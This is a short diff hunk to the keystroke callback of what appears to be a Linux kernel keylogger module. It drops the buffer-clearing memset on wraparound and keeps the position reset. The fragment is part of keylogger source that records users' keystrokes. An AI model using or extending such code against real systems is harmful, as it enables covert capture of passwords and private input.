@@ -164,10 +164,8 @@ int keysniffer_cb(struct notifier_block *nblock,
 	if (len < 1)
 		return NOTIFY_OK;
 
-	if ((buf_pos + len) >= BUF_LEN) {
-		memset(keys_buf, 0, BUF_LEN);
+	if ((buf_pos + len) >= BUF_LEN)
 		buf_pos = 0;
-	}
 
 	strncpy(keys_buf + buf_pos, keybuf, len);
 	buf_pos += len;
